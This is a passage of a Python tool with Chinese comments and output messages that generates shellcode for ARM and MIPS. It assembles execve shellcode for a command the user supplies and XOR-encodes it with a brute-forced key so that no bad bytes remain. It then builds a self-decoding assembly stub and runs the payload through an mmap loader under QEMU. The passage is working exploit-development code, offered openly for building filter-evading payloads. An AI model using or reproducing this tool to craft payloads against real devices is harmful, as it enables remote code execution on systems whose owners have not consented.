        strb r8, [r4], #1         
        mov r8, r7, lsr #16
        strb r8, [r4], #1           
        mov r8, r7, lsr #24
        strb r8, [r4], #1             
        subs r6, r6, #1             
        bne decode_loop              
        {loop_count_loader_for_jump}
        lsl r8, r8, #2
        sub r4, r4, r8
        bx r4
    payload_start:
        """

    def __init__(self, bad_bytes, save_files=False):
        """
        初始化编码器并自动执行整个编码流程。
        """
        # 步骤 1: 初始化所有属性
        self.raw_shellcode = None
        self.xor_encoded_shellcode = None
        self.xor_decoder_shellcode = None

        self.bad_bytes = bad_bytes
        self.save_files = save_files
        self.key = None
        self.loop_count = 0

    def _generate_shellcode_from_asm(self, command):
        """
        使用 ARM 汇编模板和交叉编译器来生成执行特定命令的原始 shellcode。
        """
        final_asm = self.EXECVE_TEMPLATE_ARM.format(command=command)
        tmp_s_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_raw_shellcode.s")
        tmp_o_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_raw_shellcode.o")
        tmp_bin_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_raw_shellcode.bin")

        with open(tmp_s_path, "w") as f:
            f.write(final_asm)

        try:
            cmd_as = [f"{config['ARM_TOOLCHAIN_PATH']}as", "-march=armv7-a", "-o", tmp_o_path, tmp_s_path]
            subprocess.run(cmd_as, check=True, capture_output=True)

            cmd_objcopy = [f"{config['ARM_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", tmp_o_path,
                           tmp_bin_path]
            subprocess.run(cmd_objcopy, check=True, capture_output=True)

            with open(tmp_bin_path, "rb") as f:
                self.raw_shellcode = f.read()
        finally:
            if not self.save_files:
                for f in [tmp_s_path, tmp_o_path, tmp_bin_path]:
                    if os.path.exists(f):
                        os.remove(f)

    def xorencoder(self):
        """
        [逻辑还原] 暴力搜索一个能生成不含坏字节 payload 的密钥。
        """
        print(f"[+] 开始进行XOR编码，处理坏字节...   定义的坏字节:{[hex(b) for b in self.bad_bytes]}")


        padding_needed = (4 - len(self.raw_shellcode) % 4) % 4
        padded_len = len(self.raw_shellcode) + padding_needed
        self.loop_count = padded_len // 4

        max_attempts = 200000
        for attempt in range(max_attempts):
            if (attempt + 1) % 50000 == 0:
                print(f"    -- 仍在搜索... (已尝试 {attempt + 1}/{max_attempts} 次)")

            key = random.randint(1, 0xFFFFFFFF)

            encoded_payload = self._internal_xorencode(key, self.raw_shellcode)
            if any(b in self.bad_bytes for b in encoded_payload):
                continue

            print(f"✅ 成功！在 {attempt + 1} 次尝试后找到安全密钥: {hex(key)}")

            self.key = key
            self.xor_encoded_shellcode = encoded_payload
            return
        raise RuntimeError(f"在 {max_attempts} 次尝试后仍未找到能生成干净 payload 的密钥。")

    def xordecoder(self):
        key_loader_asm = self._get_safe_value_loader('r5', self.key)
        count_loader_asm = self._get_safe_value_loader('r6', self.loop_count)
        loop_count_loader_for_jump_asm = self._get_safe_value_loader('r8', self.loop_count)

        decoder_asm_final = self.DECODER_TEMPLATE_ARM.format(
            key_loader=key_loader_asm,
            count_loader=count_loader_asm,
            loop_count_loader_for_jump=loop_count_loader_for_jump_asm
        )

        self.xor_decoder_shellcode = self._compile(decoder_asm_final)

    def verify_shellcode(self, shellcode):

        c_shellcode = ", ".join([f"0x{b:02x}" for b in shellcode])

        # C 语言加载器模板
        c_loader_code = f"""
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {{ {c_shellcode} }};

int main(void) {{
    void *mem = mmap(NULL, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) {{
        perror("mmap");
        return 1;
    }}
    memcpy(mem, shellcode, sizeof(shellcode));
    fflush(stdout);
    ((void (*)(void))mem)();
    return 0;
}}
"""
        c_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_verify_shellcode.c")
        elf_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_verify_shellcode")

        try:
            # 写入 C 文件
            with open(c_file_path, "w") as f:
                f.write(c_loader_code)
            print(f"[+] C语言测试文件 '{c_file_path}' 已成功生成。")

            # 编译 C 文件
            subprocess.run([
                f"{config['ARM_TOOLCHAIN_PATH']}gcc",
                "-o", elf_file_path,
                c_file_path,
                "-static"
            ], check=True, capture_output=True)
            print(f"[+] 编译成功! 可执行文件 '{elf_file_path}'")
            result = subprocess.run([config['ARM_PATH'], elf_file_path], capture_output=True, text=True)
            print(result.stdout)
            if result.stderr:
                print("--- stderr ---")
                print(result.stderr)

            if result.returncode == 0:
                print("✅ 验证成功: Shellcode 似乎已成功执行 (QEMU 返回值为 0)。")
            else:
                print(f"[!] 验证警告: Shellcode 执行后 QEMU 返回非零值 ({result.returncode})。可能表示执行中出现问题。")

        except subprocess.CalledProcessError as e:
            print(f"\n[!!!] 验证失败: 编译 C 加载器时出错。")
            print(f"--- (stderr) ---\n{e.stderr.decode('utf-8', errors='ignore')}--------------------")

    def _internal_xorencode(self, key, data_to_encode):
        arm_nop = b'\x01\x10\xa0\xe1'
        padding_needed = (4 - len(data_to_encode) % 4) % 4

        padded_data = data_to_encode + (arm_nop * (padding_needed // 4))

        encoded_buffer = bytearray()
        for i in range(0, len(padded_data), 4):
            chunk = padded_data[i:i + 4]
            dword = int.from_bytes(chunk, 'little')
            xored_dword = (dword ^ key).to_bytes(4, 'little')
            encoded_buffer.extend(xored_dword)
        return bytes(encoded_buffer)

    def _get_safe_value_loader(self, register, value):
        instr = ""
        if value == 0:
            return f"eor {register}, {register}, {register}\n"

        first_byte = value & 0xFF
        instr += f"mov {register}, #{first_byte}\n"

        if (value >> 8) & 0xFF != 0:
            second_byte = (value >> 8) & 0xFF
            instr += f"orr {register}, {register}, #{second_byte << 8}\n"

        if (value >> 16) & 0xFF != 0:
            third_byte = (value >> 16) & 0xFF
            instr += f"orr {register}, {register}, #{third_byte << 16}\n"

        if (value >> 24) & 0xFF != 0:
            fourth_byte = (value >> 24) & 0xFF
            instr += f"orr {register}, {register}, #{fourth_byte << 24}\n"

        return instr

    def _compile(self, asm_code):
        tmp_s_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_xor_decoder.s")
        tmp_o_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_xor_decoder.o")
        tmp_bin_path = os.path.join(config["SHELLCODE_DIRECTORY"], "arm_xor_decoder.bin")
        with open(tmp_s_path, "w") as f:
            f.write(asm_code)
        try:
            cmd = [f"{config['ARM_TOOLCHAIN_PATH']}as", "-march=armv7-a", "-o", tmp_o_path, tmp_s_path]
            subprocess.run(cmd, check=True, capture_output=True)

            subprocess.run(
                [f"{config['ARM_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", tmp_o_path, tmp_bin_path],
                check=True, capture_output=True)
            with open(tmp_bin_path, "rb") as f:
                binary_code = f.read()
            return binary_code
        except subprocess.CalledProcessError as e:
            print(
                f"\n[!!!] 汇编失败! 来自 'as' 的错误信息:\n--- (stderr) ---\n{e.stderr.decode('utf-8', errors='ignore')}--------------------")
            return b''
        finally:
            if not self.save_files:
                for f in [tmp_s_path, tmp_o_path, tmp_bin_path]:
                    if os.path.exists(f): os.remove(f)


def check_toolschain(path, arch, endian):

    print(f"🔎 检查工具链...")
    logging.info(f"🔎 检查工具链...")

    def check_dependencies(path):
        tools = ["gcc", "as", "ld", "objcopy"]
        all_found = True
        for tool in tools:
            tool_name = f"{config[path]}{tool}"
            if not shutil.which(tool_name):
                all_found = False
                print(
                    f"错误: 交叉编译工具 '{tool_name}' 未找到。\n"
                    f"请确保您的 MIPS 交叉编译工具链已安装并在系统 PATH 中。"
                )
            else:
                logging.info(f"✅ 工具链 '{tool_name}' 已存在，无需执行任何操作。")
        return all_found

    if check_dependencies(path):
        print(f"✅ 对应交叉编译工具均已安装。")
        logging.info(f"✅ 对应交叉编译工具均已安装。")
    else:
        if arch.lower() == "mips":
            if endian == "little":
                path = config['DOWNLOAD_MIPSEL_TOOLCHAIN_URL']
            else:
                path = config['DOWNLOAD_MIPS_TOOLCHAIN_URL']
        else:
            if endian == "little":
                path = config['DOWNLOAD_ARM_TOOLCHAIN_URL']
            else:
                path = config['DOWNLOAD_ARMEB_TOOLCHAIN_URL']
        print(f"ℹ️ 目标工具链 '{path}' 不存在，开始执行下载和解压任务...")
        try:
            filename = os.path.basename(urllib.parse.urlparse(path).path)
            print(f"🔽 正在从 '{path}' 下载文件...")

            with subprocess.Popen(
                    ["wget", path, "-O", f"/{current_user}/tools/{filename}"],
                    stderr=subprocess.PIPE,
                    bufsize=1,
                    universal_newlines=True
            ) as process:
                for line in process.stderr:
                    line = line.strip()
                    if line:
                        sys.stdout.write(f"\r{line}")
                        sys.stdout.flush()
                sys.stdout.write("\n")
                if process.wait() != 0:
                    raise subprocess.CalledProcessError(
                        process.returncode, process.args
                    )
            print(f"👍 下载成功，文件已保存至: /{current_user}/tools/{filename}")
        except FileNotFoundError:
            print("❌ 错误: 'wget' 命令未找到。请确保它已安装并位于系统的 PATH 环境变量中。")
            return False
        except subprocess.CalledProcessError as e:
            # 捕获 wget 执行失败的错误
            print(f"❌ 使用 wget 下载失败。返回码: {e.returncode}")
            print(f"错误输出:\n{e.stderr.decode('utf-8', errors='ignore')}")
            return False

        # --- 4. 创建目录并使用 tar 解压文件 ---
        try:
            print(f"📦 正在将 '/{current_user}/tools/{filename}' 解压到 '/{current_user}/tools/'...")
            subprocess.run(["tar", "-xf", f"/{current_user}/tools/{filename}", "-C", f"/{current_user}/tools/"],
                           check=True, capture_output=True)
            print(f"\n🎉 任务完成！文件已成功下载并解压到 /home/{current_user}/tools/{filename}。")
        except FileNotFoundError:
            print("❌ 错误: 'tar' 命令未找到。请确保它已安装并位于系统的 PATH 环境变量中。")
            return False
        except subprocess.CalledProcessError as e:
            print(f"❌ 使用 tar 解压失败。返回码: {e.returncode}")
            print(f"错误输出:\n{e.stderr.decode('utf-8', errors='ignore')}")
            return False
        return True


def check_bad_bytes(binary_data: bytes) -> Tuple[bool, List[str]]:
    found_bad_bytes = []
    for hex_byte in config["BAD_BYTES"]:
        clean_hex_byte = hex_byte.replace('0x', '').replace('0X', '')

        clean_hex_byte = clean_hex_byte.strip()

        if len(clean_hex_byte) == 1:
            clean_hex_byte = '0' + clean_hex_byte
        elif not clean_hex_byte:
            continue
        try:
            byte_to_check = bytes.fromhex(clean_hex_byte)
        except ValueError:
            print(f"警告: 无效的十六进制字符串 '{clean_hex_byte}'。跳过。")
            continue

        if byte_to_check in binary_data:
            found_bad_bytes.append(clean_hex_byte)

    return (len(found_bad_bytes) > 0, found_bad_bytes)


def print_as_c_string(data, var_name="shellcode"):
    print(f"char {var_name}[] =")
    for i in range(0, len(data), 4):
        chunk = data[i:i + 4]
        hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
        print(f'    "{hex_string}"')
    print(";")


def print_as_python_bytes(data, var_name="shellcode", line_len=20):
    print(f'{var_name} = b""')

    for i in range(0, len(data), line_len):
        chunk = data[i:i + line_len]
        hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
        print(f'{var_name} += b"{hex_string}"')


def Mips_Runtime_Patching(number1, number2, save_file=False):
    asm_mips3 = """
.section .text
.set noreorder
.set noat
.globl main
main:
    lw  	$t2,{number1}($sp)
    lw  	$t3,{number2}($sp)
    addu 	$t3,$t3,$t2
    sw      $t3,{number1}($sp)
"""
    try:
        asm_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_test_shellcode.s")
        obj_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_test_shellcode.o")
        bin_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_test_shellcode.bin")
        temp_asm = asm_mips3.format(number1=number1, number2=number2)
        with open(asm_file_path, "w") as f:
            f.write(temp_asm)

        subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}as", "-o", obj_file_path, asm_file_path], check=True)
        result = subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}objdump", "-d", obj_file_path], capture_output=True,
                                text=True, check=True)
        print(result.stdout.strip())
        print("------------------------------\n")
        subprocess.run(
            [f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "--only-section=.text", obj_file_path,
             bin_file_path], check=True)
        with open(bin_file_path, "rb") as f:
            shellcode = f.read()
            print("编译成功! Shellcode 已生成到:", bin_file_path)
            # ---去除末尾的0x00---
            shellcode = shellcode.rstrip(b'\x00')
            if b'\x00' in shellcode:
                print_content = "\n⚠️ ---[ 坏字节检查: 失败! shellcode 中含有'\\x00'字节]---"
            else:
                print_content = "\n✅ ---[ 坏字节检查: 成功! Shellcode 中不含'\\x00'字节]---"
            print(print_content, "Shellcode (长度:", len(shellcode), "字节)")
            print_as_python_bytes(shellcode)

    except FileNotFoundError:
        print(
            f"[!] 错误: MIPS 交叉编译工具链未找到, 请检查 config['MIPS_TOOLCHAIN_PATH'] 的设置: '{config['MIPS_TOOLCHAIN_PATH']}'")
    except subprocess.CalledProcessError as e:
        print(f"[!] 编译失败: {e}")
        if hasattr(e, 'stderr') and e.stderr:
            print(f"错误详情: {e.stderr.decode('utf-8', 'ignore')}")
    except Exception as e:
        print(f"[!] 发生错误: {e}")
    finally:
        files_to_clean = [asm_file_path, obj_file_path, bin_file_path]
        for f in files_to_clean:
            if os.path.exists(f):
                os.remove(f)


def main():
    parser = argparse.ArgumentParser(
        description=" ARM 或 MIPS 架构无bad char shellcode 生成器。(arm只有小端能运行)",
        formatter_class=argparse.RawTextHelpFormatter
    )
    mips_group = parser.add_argument_group("MIPS 额外参数。")
    mips_group.add_argument("-short", "--short", action="store_true",
                            help="生成较短的 shellcode，处理过bad_bytes，使用自修复代码方式实现，未用xor编码方式。")
    mips_group.add_argument("-l", "--long_shellcode", action="store_true", help="生成较长的 shellcode。")
    mips_group.add_argument("-rp", "--Mips_Runtime_Patching", nargs=2,
                            help="运行时修补 / 内存修补 (Runtime Patching / In-Memory Patching)，当程序对shellcode某个字节有转义或过滤时可使用，如\\x3c转为\\x00导致shellcode无法执行。")
    mips_group.add_argument("-s", "--sleep", action="store_true", help="在shellcode前面加上睡眠指令,default 3 秒。")

    parser.add_argument("-arch", "--arch", choices=['arm', 'mips'], help="目标CPU架构 (arm 或 mips)。")
    parser.add_argument("-e", "--endian", choices=['big', 'little'], help="shellcode 字节序 (big 或 little)。")
    parser.add_argument("-cmd", "--cmd", help="要执行的命令。")
    parser.add_argument("-xor", "--xor_encode", action="store_true", help="对 shellcode 进行XOR编码。")
    parser.add_argument("-v", "--verify", action="store_true", help="编译运行验证 shellcode。")
    parser.add_argument("-sf", "--save_file", action="store_true", help="保存中间文件。")
    parser.add_argument("-b", "--bad_bytes", nargs="+",
                        help="坏字节列表 (十六进制),default: 0x00,0x3b,0x0a,0x0b,0x0c,0x0d,0x20,0x09")
    parser.add_argument("-fts", "--function_truncation_summary", action="store_true", help="显示函数截断汇总信息表。")
    args = parser.parse_args()

    # 打印函数截断汇总信息表
    if args.function_truncation_summary:
        summary = FunctionTruncationSummary()
        summary.print_summary()
        return

    if args.bad_bytes:
        print(f"[覆盖配置] 检测到自定义值: {args.bad_bytes}。覆盖 config['BAD_BYTES']。")
        config['BAD_BYTES'] = args.bad_bytes
    else:
        print("[使用配置] 未检测到自定义值，使用 config['BAD_BYTES'] 的默认值。")

    raw_bad_bytes = config['BAD_BYTES']
    args.bad_bytes = [
        int(b.strip(), 16) if isinstance(b, str) else b
        for b in (
            raw_bad_bytes[0].split(',')
            if isinstance(raw_bad_bytes, list) and len(raw_bad_bytes) == 1 and isinstance(raw_bad_bytes[0],
                                                                                          str) and ',' in raw_bad_bytes[
                   0]
            else (
                raw_bad_bytes.split(',')
                if isinstance(raw_bad_bytes, str)
                else raw_bad_bytes
            )
        )
    ]

    if not args.arch:
        print("请指定架构: -arch arm 或 -arch mips")
        return
    elif not args.cmd:
        print("请指定要执行的命令: -cmd 'echo hello world'")
        return
    elif not args.endian:
        print("请指定字节序: -e big 或 -e little")
        return
    if args.arch.lower() == "mips":
        if args.endian.lower() == "little":
            print(f"ℹ️  info: 架构：MIPS，字节序：小端（little-endian）， 命令：{args.cmd}")
            config[
                'MIPS_TOOLCHAIN_PATH'] = f"{current_user}/tools/mips32el--glibc--stable-2024.05-1/bin/mipsel-buildroot-linux-gnu-"
            config['QEMU_PATH'] = "qemu-mipsel"
        else:
            config[
                'MIPS_TOOLCHAIN_PATH'] = f"{current_user}/tools/mips32--glibc--stable-2024.05-1/bin/mips-buildroot-linux-gnu-"
            config['QEMU_PATH'] = "qemu-mips"
            print(f"ℹ️  info: 架构：MIPS，字节序：大端（big-endian）， 命令：{args.cmd}")
        # --- 1. 检查工具链 ---
        check_toolschain("MIPS_TOOLCHAIN_PATH", args.arch, args.endian)
        if args.cmd and args.short:
            Mips_Generate_short_shellcode(args.cmd, args.endian, args.save_file)
            return
        if args.Mips_Runtime_Patching:
            number1 = args.Mips_Runtime_Patching[0]
            number2 = args.Mips_Runtime_Patching[1]
            Mips_Runtime_Patching(number1, number2)
        # --- 2. 生成原始shellcode ---
        if args.cmd:
            print("===" * 30)
            # ---2.1 生成短shellcode---(汇编模板)
            if not args.long_shellcode:
                raw_shellcode = MipsShellcodeGenerator(args.cmd, args.save_file)
            # ---2.2 生成长shellcode---(C + 汇编模板)
            else:
                raw_shellcode = MipsShellcodeGenerator_long(args.cmd, args.arch, args.save_file)
            raw_shellcode_get = raw_shellcode.raw_shellcode
            print("✅ 生成原始 shellcode 成功 (长度: " + str(len(raw_shellcode_get)) + "字节)")
            print_as_python_bytes(raw_shellcode_get)
        # --- 3. 对 shellcode 进行 XOR 编码 ---
        if args.xor_encode:
            if args.sleep:
                sleep = Sleep()
                raw_shellcode_get = (sleep.Sleep_shellcode + raw_shellcode_get)
            else:
                raw_shellcode_get = raw_shellcode_get
            xor_encoder = XorEncoder(raw_shellcode_get, endian=args.endian, bad_bytes=args.bad_bytes)
            print("    -- xor编码后的shellcode (长度: " + str(len(xor_encoder.xor_encoded_shellcode)) + " 字节)")
            print_as_python_bytes(xor_encoder.xor_encoded_shellcode)
            key = xor_encoder.key
            loop_count = len(xor_encoder.xor_encoded_shellcode) // 4
            val_for_loop_count = -(loop_count + 1)

            # --- 4. 生成解码器 ---
            xor_decoder = XorDecoder(xor_encoder.xor_encoded_shellcode, key, args.save_file)
            print(
                f"✅  解码器生成成功，密钥: {hex(xor_decoder.key)}，循环次数: {loop_count}，循环次数值: {val_for_loop_count}, -- 解码器shellcode (长度 {str(len(xor_decoder.xor_decoded_shellcode))} 字节)")
            # --- 5. 打印解码器shellcode ---
            print_as_python_bytes(xor_decoder.xor_decoded_shellcode)
            # 调用方法生成解码器
            if xor_decoder and xor_encoder:
                merged_shellcode = xor_decoder.xor_decoded_shellcode + xor_encoder.xor_encoded_shellcode
                found, bad_bytes = check_bad_bytes(merged_shellcode)
                print(f"shellcode_data: 在解码器找到坏字节？{found}, 坏字节列表: {bad_bytes}")
                print(f"✅ xor解码器长度({str(len(xor_decoder.xor_decoded_shellcode))}字节) + xor编码后的shellcode长度({str(len(xor_encoder.xor_encoded_shellcode))}字节) = {str(len(merged_shellcode))} 字节")
                print_as_python_bytes(merged_shellcode)
        else:
            merged_shellcode = raw_shellcode_get
        if args.verify:
            # xor解码器+xor编码后的shellcode合并测试
            MipsVerifyShellcode(merged_shellcode)
    elif args.arch.lower() == "arm":
        if args.endian.lower() == "little":
            print(f"ℹ️  info: 架构：ARM，字节序：小端（little-endian）， 命令：{args.cmd}")
            config[
                'ARM_TOOLCHAIN_PATH'] = f"{current_user}/tools/armv7-eabihf--uclibc--stable-2024.05-1/bin/arm-buildroot-linux-uclibcgnueabihf-"
            config['ARM_PATH'] = "qemu-arm"
        else:
            print(f"ℹ️  info:架构：ARM，字节序：大端（big-endian）， 命令：{args.cmd}")
            config[
                'ARM_TOOLCHAIN_PATH'] = f"{current_user}/tools/armebv7-eabihf--uclibc--stable-2024.05-1/bin/armeb-buildroot-linux-uclibcgnueabihf-"
            config['ARM_PATH'] = "qemu-armeb"
        # --- 1. 检查工具链 ---
        check_toolschain("ARM_TOOLCHAIN_PATH", args.arch, args.endian)
        print("===" * 30)
        if args.cmd:
            # --- 2. 生成原始shellcode ---
            shellcode = ArmShellcodeGenerator(bad_bytes=args.bad_bytes, save_files=args.save_file)
            shellcode._generate_shellcode_from_asm(args.cmd)
            raw_shellcode_get = shellcode.raw_shellcode
            print("✅ 生成原始 shellcode 成功 (长度: " + str(len(raw_shellcode_get)) + "字节)")
            print_as_python_bytes(raw_shellcode_get)
        if args.cmd and args.xor_encode:
            # --- 3.  XOR 编码 ---
            shellcode.xorencoder()
            print("    -- xor编码后的shellcode (长度: " + str(len(shellcode.xor_encoded_shellcode)) + " 字节)")
            print_as_python_bytes(shellcode.xor_encoded_shellcode)
            # --- 4. 生成解码器 ---
            shellcode.xordecoder()
            print(f"✅  解码器生成成功，密钥: {hex(shellcode.key)}")
            print("    -- xor解码器shellcode (长度: " + str(len(shellcode.xor_decoder_shellcode)) + " 字节)")
            print_as_python_bytes(shellcode.xor_decoder_shellcode)
            merged_shellcode = shellcode.xor_decoder_shellcode + shellcode.xor_encoded_shellcode
            print(
                f"✅  xor解码器长度({str(len(shellcode.xor_decoder_shellcode))}字节) + xor编码后的shellcode长度({str(len(shellcode.xor_encoded_shellcode))}字节) = {str(len(merged_shellcode))} 字节")
            found, bad_bytes = check_bad_bytes(merged_shellcode)
            print(f"shellcode_data: 在解码器找到坏字节？{found}, 坏字节列表: {bad_bytes}")
            print_as_python_bytes(merged_shellcode)
        else:
            merged_shellcode = shellcode.raw_shellcode
        print("=" * 50)
        if args.verify:
            shellcode.verify_shellcode(merged_shellcode)
        print("-" * 60)


if __name__ == "__main__":
    main()
